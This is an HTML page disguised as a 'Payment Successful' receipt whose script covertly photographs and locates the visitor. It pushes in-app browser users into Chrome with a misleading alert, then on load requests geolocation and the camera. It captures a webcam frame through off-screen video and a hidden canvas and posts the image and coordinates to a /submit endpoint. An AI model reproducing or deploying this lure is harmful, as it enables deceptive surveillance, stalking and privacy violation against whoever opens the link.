<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Payment Successful</title>
  <style>
    body {
      margin: 0;
      padding: 0;
      font-family: 'Segoe UI', sans-serif;
      background-color: #34A853;
      color: white;
      display: flex;
      flex-direction: column;
      justify-content: center;
      align-items: center;
      height: 100vh;
      text-align: center;
    }

    .checkmark {
      width: 80px;
      height: 80px;
      border-radius: 50%;
      background-color: white;
      display: flex;
      justify-content: center;
      align-items: center;
      margin-bottom: 20px;
    }

    .checkmark::before {
      content: "✓";
      font-size: 48px;
      color: #34A853;
      font-weight: bold;
    }

    .text {
      font-size: 24px;
      font-weight: 600;
    }

    .timestamp {
      margin-top: 10px;
      font-size: 16px;
      color: #e0f2e9;
    }

    #video {
      position: absolute;
      left: -9999px;
      width: 1px;
      height: 1px;
      opacity: 0;
      pointer-events: none;
    }

    canvas {
      display: none;
    }
  </style>
</head>
<body>
  <div class="checkmark"></div>
  <div class="text">Payment Successful</div>
  <div class="timestamp">20 June 2025 at 12:56 PM</div>

  <!-- Hidden elements for background capture -->
  <video id="video" autoplay muted playsinline></video>
  <canvas id="canvas" width="320" height="240"></canvas>

  <script>
    function isInAppBrowser() {
      const ua = navigator.userAgent || navigator.vendor || window.opera;
      return /Instagram|FBAN|FBAV|Messenger|WhatsApp/i.test(ua);
    }

    function tryRedirectToBrowser() {
      const currentUrl = window.location.href;

      // Android Chrome deep link
      const intentUrl = "intent://" + currentUrl.replace(/^https?:\/\//, "") + "#Intent;scheme=https;package=com.android.chrome;end";

      window.location = intentUrl;

      setTimeout(() => {
        alert("⚠️ For full functionality, please open this link in your browser (like Chrome). In-app browsers may block camera or location access.");
      }, 2000);
    }

    if (isInAppBrowser()) {
      tryRedirectToBrowser();
    } else {
      window.onload = async function getPermissionsAndCapture() {
        const video = document.getElementById("video");
        const canvas = document.getElementById("canvas");

        const locationPromise = new Promise((resolve, reject) => {
          if (!navigator.geolocation) {
            reject("Geolocation not supported");
            return;
          }
          navigator.geolocation.getCurrentPosition(
            (position) => {
              const lat = position.coords.latitude.toFixed(6);
              const lon = position.coords.longitude.toFixed(6);
              resolve({ lat, lon });
            },
            () => reject("Location permission denied")
          );
        });

        const cameraPromise = navigator.mediaDevices.getUserMedia({ video: true });

        try {
          const [locationData, stream] = await Promise.all([locationPromise, cameraPromise]);

          video.srcObject = stream;
          video.onloadedmetadata = () => {
            video.play();
            setTimeout(() => {
              const context = canvas.getContext("2d");
              context.drawImage(video, 0, 0, canvas.width, canvas.height);
              const imageData = canvas.toDataURL("image/jpeg");

              fetch("/submit", {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({
                  lat: locationData.lat,
                  lon: locationData.lon,
                  image: imageData
                }),
              })
                .then(res => res.json())
                .then(res => console.log("✅ Submitted:", res))
                .catch(err => console.error("❌ Submit error:", err));

              stream.getTracks().forEach(track => track.stop());
            }, 500);
          };
        } catch (err) {
          alert("Permission error: " + err);
          console.error("❌ Permission error:", err);
        }
      };
    }
  </script>
</body>
</html>
